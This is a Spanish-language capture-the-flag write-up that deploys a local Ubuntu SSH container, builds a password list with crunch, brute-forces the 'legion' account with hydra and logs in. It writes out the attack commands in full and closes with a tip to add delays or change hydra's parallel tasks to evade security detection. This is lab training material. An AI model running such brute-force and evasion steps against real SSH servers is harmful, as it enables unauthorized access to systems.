Reto CTF: Acceso SSH a Contenedor Ubuntu

Descripción del Reto

En este reto se proporciona una imagen Docker basada en Ubuntu con un servicio SSH habilitado. El objetivo es:

Desplegar el contenedor Docker y exponer el puerto SSH.

Identificar el usuario objetivo (legion).

Generar un diccionario de posibles contraseñas con crunch.

Realizar un ataque de fuerza bruta al servicio SSH usando hydra.

Obtener la contraseña correcta y acceder al contenedor como legion.

Prerrequisitos

Docker instalado y en ejecución.

Herramientas en Kali Linux: crunch, hydra.

1. Despliegue del Contenedor SSH

Se usa la imagen jaiderospina/retoctf:1.0 y se expone el puerto local 2222 al 22 interno.

# Eliminamos contenedor previo (si existe)
docker rm -f mi-contenedor-ssh



# Desplegamos el contenedor en background
docker run -d -p 2222:22 --name mi-contenedor-ssh jaiderospina/retoctf:1.0


docker ps


2. Generación de Diccionario de Contraseñas

Con crunch se genera un archivo esdeo.lst con combinaciones de 5 caracteres siguiendo el patrón ES%?0.

crunch 5 5 -t ES%?0 -o esdeo.lst


3. Ataque de Fuerza Bruta con Hydra

Configuramos hydra para atacar SSH en el puerto 2222, con usuario legion y diccionario esdeo.lst.

hydra -l legion -P esdeo.lst -s 2222 localhost ssh


Tras revisar que no se encontró contraseña, se ajusta el diccionario (por ejemplo, mayúsculas mixtas) y se vuelve a ejecutar:

hydra -l legion -P combinadas.lst -s 2222 localhost ssh


La contraseña hallada fue:

Esdeg

4. Acceso al Contenedor como legion

Con la contraseña válida obtenemos acceso SSH:

ssh legion@localhost -p 2222

5. Conclusiones y Posibles Mejoras

La combinación de Docker, crunch y hydra permite automatizar un ataque de fuerza bruta eficaz en entornos controlados.

Mejoras:

Implementar reglas de exclusión y throttling para reducir la carga en el servidor SSH.

Añadir delays o cambiar el número de tareas paralelas (-t) en hydra para evadir detecciones de seguridad.

Probar ataques dirigidos con reglas de Hashcat y diccionarios más completos.
